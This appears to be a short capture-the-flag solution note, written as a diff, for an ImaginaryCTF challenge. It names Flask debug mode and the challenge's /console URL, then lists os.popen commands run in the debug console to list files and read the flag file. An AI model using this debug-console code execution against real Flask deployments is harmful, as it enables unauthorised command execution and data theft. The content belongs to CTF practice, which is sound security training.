@@ -1,0 +1,5 @@
+flask debug mode
+http://puzzler7.imaginaryctf.org:3002/console
+import os
+os.popen('ls').read()
+os.popen('cat man_this_sure_is_an_odd_name_for_a_flag_file').read()
